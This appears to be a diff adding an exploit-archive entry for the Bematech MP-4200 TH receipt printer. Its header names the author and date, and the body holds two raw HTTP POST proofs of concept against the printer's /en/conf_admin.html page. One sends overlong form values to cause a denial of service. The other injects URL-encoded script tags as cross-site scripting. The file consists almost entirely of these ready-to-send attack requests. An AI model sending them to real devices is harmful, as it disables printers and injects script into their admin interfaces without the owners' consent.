@@ -1,0 +1,41 @@
+# Exploit Title: Bematech Printer MP-4200 - Denial of Service 
+# Date: 2019-11-11
+# Exploit Author: Jonatas Fil
+# Vendor Homepage: https://www.bematech.com.br/
+# Software Link: https://www.bematech.com.br/produto/mp-4200-th/
+# Version: MP-4200 TH
+# Tested on: Windows and Linux
+# CVE : N/A
+
+DoS Poc:
+--------------------------------------------------------------------------------------------------------
+POST /en/conf_admin.html HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML,
+like Gecko) Chrome/73.0.3683.75 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9,pt;q=0.8
+Cache-Control: max-age=0
+Referer: http://TARGET/en/conf_admin.html
+Content-Length: 40
+Content-Type: application/x-www-form-urlencoded
+
+admin=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&person=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&SUBMIT_ADMIN=Submit
+
+--------------------------------------------------------------------------------------------------------
+XSS Poc:
+--------------------------------------------------------------------------------------------------------
+POST /en/conf_admin.html HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML,
+like Gecko) Chrome/73.0.3683.75 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9,pt;q=0.8
+Cache-Control: max-age=0
+Referer: http://printer.com/en/conf_admin.html
+Content-Length: 40
+Content-Type: application/x-www-form-urlencoded
+
+admin=%3C%2Ftd%3E%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E&person=%3C%2Ftd%3E%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E&SUBMIT_ADMIN=Submit
